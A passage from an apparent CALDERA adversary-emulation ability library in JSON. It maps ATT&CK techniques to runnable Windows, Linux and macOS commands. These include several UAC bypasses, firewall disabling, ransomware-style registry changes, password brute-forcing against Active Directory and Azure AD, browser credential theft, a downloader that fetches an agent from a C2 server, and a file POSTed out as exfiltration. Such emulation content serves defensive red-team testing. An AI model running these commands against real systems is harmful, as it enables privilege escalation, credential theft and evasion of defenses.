HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f && cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "e7a987cbef27263e666e5b096488dc55", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "BlackByte Ransomware Registry Changes - CMD", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "d2f6cb279552f1b65a9805d63eed1689", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "BlackByte Ransomware Registry Changes - Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f; cmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" ; cmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"; rm $env:temp\\psexec.exe"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd.exe /c \"wmic \tcsproduct \tget UUID\" ; cmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" ; cmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"; reg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      ; copy $pathtoatomicsfolder\\T1569.002\\bin\\PsExec.exe $env:temp; cmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \"--access-token\"\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Services: Service Execution", "ability_id": "c3aaa4585223289f5f29e977253dd045", "technique_id": "T1569.002", "tactic": "execution", "requirements": [], "name": "BlackCat pre-encryption cmds with Lateral Movement", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["netsh firewall set opmode mode=enable >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh firewall set opmode mode=disable", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "eeffd7795c1a6eee8f164531ac80a0fd", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Blackbit - Disable Windows Firewall using netsh firewall", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Copy-Item \"$env:temp\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Remove-Item \"$env:temp\\Login Data\" > $null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"$env:temp\" > $null; Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Copy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null; cd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"; .\\BrowserCollector.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "ability_id": "cf4411185e815ccecbe712b46ae2156e", "technique_id": "T1555.003", "tactic": "credential-access", "requirements": [], "name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["5cb955_passwords.txt"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $passwordList = Get-Content -Path 5cb955_passwords.txt; foreach ($password in $passwordList){;   $credz = new-object System.Net.NetworkCredential(\"$ENV:USERNAME\", $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account $ENV:USERNAME.\";     $conn.bind();     Write-Host \" [!] $ENV:USERNAME:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of bruteforce\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Guessing", "ability_id": "b2d33bf89e8cd3fa19911b8650804087", "technique_id": "T1110.001", "tactic": "credential-access", "requirements": [], "name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo Password1> passwords.txt && echo 1q2w3e4r>> passwords.txt && echo Password!>> passwords.txt && echo Spring2022>> passwords.txt && echo ChangeMe!>> passwords.txt && @FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Guessing", "ability_id": "09fc509d77ec1ce89738bedeac2e9e3a", "technique_id": "T1110.001", "tactic": "credential-access", "requirements": [], "name": "Brute Force Credentials of single Active Directory domain users via SMB", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Import-Module -Name AzureAD; $passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\"); foreach($password in $passwords) {;   $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword;   try {;     Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\";     Connect-AzureAD -Credential $Credential 2>&1> $null;     Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\";     break;   } catch {;     Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\";   }; }; Write-Host \"End of bruteforce\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Password Guessing", "ability_id": "3883fdbd7c29b2f2f20121c75f875944", "technique_id": "T1110.001", "tactic": "credential-access", "requirements": [], "name": "Brute Force Credentials of single Azure AD user", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd $env:temp; .\\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteforce.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Brute Force: Credential Stuffing", "ability_id": "e9a13658d13fbb309abf51dce4a71f55", "technique_id": "T1110.004", "tactic": "credential-access", "requirements": [], "name": "Brute Force:Credential Stuffing using Kerbrute Tool", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize Deploy Container using that custom image.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["docker stop t1612_container; docker rmi -f t1612"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "docker build -t t1612  $PathtoAtomicsFolder/T1612/src/; docker run --name t1612_container  -d -t t1612; docker exec t1612_container ./test.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Build Image on Host", "ability_id": "b62ae2359c40c2f5cd25881ad9b16008", "technique_id": "T1612", "tactic": "defense-evasion", "requirements": [], "name": "Build Image On Host", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Ensure the ExecutionPolicy is turned to Bypass", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Bypass ExecutionPolicy", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Bypass user account controls - medium", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["Bypass-UAC.ps1"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e", "technique_id": "T1548.002", "tactic": "privilege-escalation", "requirements": [], "name": "Bypass UAC Medium", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul && del \"c:\\testbypass.exe\" >nul 2>nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\" && copy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\" && mklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "88b05adaded4e793f1bfee0072c72da3", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC by Mocking Trusted Directories", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "f91d7dfb1e6fd4fa742f24927ca4af26", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC using ComputerDefaults (PowerShell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "7440c68b83b6d728b4111d083facefec", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC using Event Viewer (PowerShell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && cmd.exe /c eventvwr.msc", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "8ad2169ec4d0df6df900f8f8959ad761", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC using Event Viewer (cmd)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && fodhelper.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "0c328b7ec82e0074cbb0745db3a53602", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC using Fodhelper", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\fodhelper.exe\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "20d68348c822d2947e5a795ac15a22b0", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC using Fodhelper - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["bc40cf_T1548.002.bat"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "bc40cf_T1548.002.bat", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "55636ecc1eac15ca3c32a9f01626e413", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC using SilentCleanup task", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "46fdbe6676f3127ac0e5de65bf70e6a7", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "Bypass UAC using sdclt DelegateExecute", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Compile a c file with either gcc or clang on Linux or Macos.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["e9248b_T1027-004-test.c"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -e  e9248b_T1027-004-test.c ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O e9248b_T1027-004-test.c; fi;  ;  gcc e9248b_T1027-004-test.c && ./a.out; clang e9248b_T1027-004-test.c && ./a.out", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["e9248b_T1027-004-test.c"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -e  e9248b_T1027-004-test.c ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O e9248b_T1027-004-test.c; fi;  ;  gcc e9248b_T1027-004-test.c && ./a.out; clang e9248b_T1027-004-test.c && ./a.out", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Compile After Delivery", "ability_id": "ec7c28b75e9af98aecb33ce5ae14e8c2", "technique_id": "T1027.004", "tactic": "defense-evasion", "requirements": [], "name": "C compile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Exfiltrates a file present on the victim machine to the C2 server.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value \"This is line $_.\" }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Exfiltration Over C2 Channel", "ability_id": "72784d12700b219ec134aa42cec5603e", "technique_id": "T1041", "tactic": "exfiltration", "requirements": [], "name": "C2 Data Exfiltration", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Compile a c file with either gcc or clang on Linux or Macos.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["d7822f_T1027-004-test.cc"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O d7822f_T1027-004-test.cc; fi;  ;  g++ d7822f_T1027-004-test.cc && ./a.out; clang++ d7822f_T1027-004-test.cc && ./a.out", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["d7822f_T1027-004-test.cc"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O d7822f_T1027-004-test.cc; fi;  ;  g++ d7822f_T1027-004-test.cc && ./a.out; clang++ d7822f_T1027-004-test.cc && ./a.out", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Compile After Delivery", "ability_id": "37ec8aa96775f561e02a954dae1b56bc", "technique_id": "T1027.004", "tactic": "defense-evasion", "requirements": [], "name": "CC compile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["0deff5_T1218.003.inf"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmstp.exe /s 0deff5_T1218.003.inf", "language": null, "name": "cmd", 